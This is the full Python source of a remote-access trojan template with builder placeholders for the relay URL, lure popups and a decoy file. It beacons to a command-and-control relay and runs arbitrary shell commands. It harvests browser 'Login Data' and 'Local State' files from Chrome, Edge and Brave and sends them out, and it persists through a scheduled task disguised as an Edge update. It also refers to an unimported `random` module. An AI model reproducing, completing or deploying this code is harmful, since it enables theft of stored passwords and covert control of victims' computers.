# payload/template.py (Full Code - Final Stability Revamp)
import sys
import os
import time
import threading
import platform
import base64
import subprocess
import uuid
import requests
import json
import socket
import getpass
import shutil
import zipfile
from datetime import datetime

# Graceful Import Handling
try:
    from mss import mss
except ImportError:
    mss = None
try:
    import winreg
except ImportError:
    winreg = None
try:
    import psutil
except ImportError:
    psutil = None
try:
    import ctypes
except ImportError:
    ctypes = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
results_to_send, results_lock = [], threading.Lock()
TERMINATE_FLAG = threading.Event()
STEALTH_DIR = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'SysData')

# --- Utility Functions ---
def send_result(command_name, output_data, status="success"):
    with results_lock:
        results_to_send.append({"command": command_name, "output": {"status": status, "data": output_data}})

def _run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip()
    except:
        return ""

def _get_appdata_paths():
    base = os.path.expanduser("~")
    return {"local": os.path.join(base, "AppData", "Local"), "roaming": os.path.join(base, "AppData", "Roaming")}

# --- Core C2 Actions ---
def _action_popup(params):
    if ctypes and hasattr(ctypes.windll, 'user32'):
        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
    return {"status": "success", "data": "Popup displayed."}

def _action_shell(params):
    command = params.get("command", "")
    return {"status": "success", "data": _run_command(command)}

def _action_pslist(params):
    if not psutil: return {"status": "error", "data": "Psutil library not available."}
    procs = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
    return {"status": "success", "data": sorted(procs, key=lambda p: p.get('name') or '')}

def harvest_browser_files(appdata_paths):
    browser_paths = {
        'Chrome': os.path.join(appdata_paths["local"], 'Google\\Chrome\\User Data'),
        'Edge': os.path.join(appdata_paths["local"], 'Microsoft\\Edge\\User Data'),
        'Brave': os.path.join(appdata_paths["local"], 'BraveSoftware\\Brave-Browser\\User Data')
    }
    files_to_exfiltrate = {}
    for browser, path in browser_paths.items():
        if not os.path.exists(path): continue
        for root, _, files in os.walk(path):
            if "Login Data" in files: files_to_exfiltrate[f"{browser}_Login_Data"] = os.path.join(root, "Login Data")
            if "Local State" in files: files_to_exfiltrate[f"{browser}_Local_State"] = os.path.join(root, "Local State")
    if not files_to_exfiltrate: return {"status": "success", "data": "No supported browser data found."}
    try:
        zip_path = os.path.join(os.environ["TEMP"], f"bdata_{SESSION_ID}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for name, path in files_to_exfiltrate.items():
                if os.path.exists(path): zf.write(path, arcname=name)
        with open(zip_path, "rb") as f: b64_zip = base64.b64encode(f.read()).decode()
        os.remove(zip_path)
        return {"status": "success", "data": b64_zip}
    except Exception as e: return {"status": "error", "data": f"Failed to package browser files: {e}"}

def perform_full_harvest():
    try:
        appdata = _get_appdata_paths()
        uname = platform.uname()
        send_result("System Info", {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "arch": uname.machine})
        time.sleep(0.1)
        browser_data = harvest_browser_files(appdata)
        send_result("Browser Files", browser_data)
        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Initial harvest complete.")
    except Exception as e:
        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] CRITICAL ERROR during harvest: {e}")

def _action_full_harvest(params):
    harvest_thread = threading.Thread(target=perform_full_harvest, daemon=True)
    harvest_thread.start()
    return {"status": "success", "data": "Full harvest initiated."}

def execute_command(command_data):
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try: result = handler_func(params)
        except Exception as e: result = {"status": "error", "data": f"Handler failed: {e}"}
    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
        except requests.exceptions.RequestException: pass

def command_and_control_loop():
    initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system()}
    while not TERMINATE_FLAG.is_set():
        try:
            with results_lock:
                outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, **initial_metadata}
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=False)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException:
            pass 
        time.sleep(random.randint(10, 18))

def initial_lure():
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(f'start "" "{decoy_path}"', shell=True, startupinfo=startupinfo)
        except: pass

def setup_persistence(stealth_path):
    if not (PERSISTENCE_ENABLED and platform.system() == "Windows"): return
    task_name = f"Microsoft Edge Update Task Core"
    command = f'schtasks /create /tn "{task_name}" /tr "\'{stealth_path}\'" /sc onlogon /rl highest /f'
    _run_command(command)

def main_logic():
    """Contains the primary C2 loop and waits for termination."""
    c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    c2_thread.start()
    TERMINATE_FLAG.wait()

if __name__ == "__main__":
    my_name = os.path.basename(sys.executable)
    stealth_path = os.path.join(STEALTH_DIR, my_name)

    # --- THE DEFINITIVE FIX: Sane Execution Flow ---
    # This logic block handles the "installer" phase of the payload.
    # It only runs if compiled and NOT in its final destination.
    if hasattr(sys, 'frozen') and os.path.abspath(sys.executable).lower() != stealth_path.lower():
        initial_lure()
        try:
            os.makedirs(STEALTH_DIR, exist_ok=True)
            shutil.copy2(sys.executable, stealth_path)
            setup_persistence(stealth_path)
            
            # Use CREATE_NO_WINDOW to ensure the new process is completely hidden
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([stealth_path], creationflags=subprocess.DETACHED_PROCESS, startupinfo=startupinfo)
        except Exception:
            # If persistence fails, we don't want to crash. The C2 loop will start below.
            pass
        finally:
            # The original executable ALWAYS exits after attempting to install.
            sys.exit(0)
    
    # This is the main execution block for the persistent payload (or if running as a .py)
    main_logic()